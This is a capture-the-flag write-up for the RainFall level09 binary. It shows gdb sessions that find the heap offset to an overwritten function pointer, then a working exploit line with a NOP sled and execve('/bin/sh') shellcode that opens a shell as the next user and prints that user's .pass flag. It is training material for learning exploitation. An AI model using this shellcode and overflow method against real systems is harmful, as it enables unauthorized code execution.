# level09

We can see that the program takes nothing even if a parameters is given. But with a large string, we can make it segfault:

```bash
level9@RainFall:~$ ./level9 
level9@RainFall:~$ ./level9 ds
level9@RainFall:~$ ./level9 dsasd
level9@RainFall:~$ ./level9 dsasd ds
level9@RainFall:~$ ./level9 $(python -c "print 'A' * 200")
Segmentation fault (core dumped)
```

Basically the program create two object, each containing a function pointer and a buffer, and copy the first parameter of the program in the buffer of the first object. At the end, it call a the function of the function pointer from the 2nd object.

We need first to calculate the length to overwrite the function address that will be called at the end:

```bash
(gdb) r AAAA
Starting program: /home/user/level9/level9 AAAA

Breakpoint 2, 0x0804867c in main ()
(gdb) x/wx $esp+0x14
0xbffff4c4:     0x0804a008
(gdb) x/wx $esp+0x18
0xbffff4c8:     0x0804a078
(gdb) p/d 0x0804a078 - 0x0804a008
$3 = 112
(gdb) x/30wx 0x0804a008
0x804a008:      0x08048848      0x41414141      0x00000000      0x00000000
0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a048:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a068:      0x00000000      0x00000000      0x00000005      0x00000071
0x804a078:      0x08048848      0x00000000
```

We can see that there is 112 bytes between the two objects, but our buffer begin after the four first bytes. We need 108 before overriding the 2nd object:

```bash
(gdb) r $(python -c "print 'A' * 108 + 'BBBB'")
Starting program: /home/user/level9/level9 $(python -c "print 'A' * 108 + 'BBBB'")

Breakpoint 2, 0x0804867c in main ()
(gdb) x/30wx 0x0804a008
0x804a008:      0x08048848      0x41414141      0x41414141      0x41414141
0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a028:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a038:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a048:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a058:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a068:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a078:      0x42424242      0x00000000
```

If we put directly the beginning of our shellcode address (0x804a00c), the program will interpet the value as another address function instead of interpreting the bytes.

We will so puts the address of the shellcode four bytes after, and reference this address at the 108 bytes.

The address to put the shellcode address is : 0x804a078 + 4 = 0x0804a07c
The address to put the shellcode is : 0x804a008 + 4 = 0x804a00c

We try in gdb:

```bash
(gdb) r $(python -c "print '\x90' * (108-28) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x7c\xa0\x04\x08' + '\x0c\xa0\x04\x08'")

Starting program: /home/user/level9/level9 $(python -c "print '\x90' * (108-28) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x7c\xa0\x04\x08' + '\x0c\xa0\x04\x08'")

Breakpoint 2, 0x0804867c in main ()
(gdb) x/30wx 0x0804a008
0x804a008:      0x08048848      0x90909090      0x90909090      0x90909090
0x804a018:      0x90909090      0x90909090      0x90909090      0x90909090
0x804a028:      0x90909090      0x90909090      0x90909090      0x90909090
0x804a038:      0x90909090      0x90909090      0x90909090      0x90909090
0x804a048:      0x90909090      0x90909090      0x90909090      0x90909090
0x804a058:      0x90909090      0x6850c031      0x68732f2f      0x69622f68
0x804a068:      0x89e3896e      0xb0c289c1      0x3180cd0b      0x80cd40c0
0x804a078:      0x0804a07c      0x0804a00c
```

We try to exploit:

```bash
level9@RainFall:~$ ./level9 $(python -c "print '\x90' * (108-28) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x7c\xa0\x04\x08' + '\x0c\xa0\x04\x08'")
$ whoami
bonus0
$ cd /home/user/bonus0
$ cat .pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
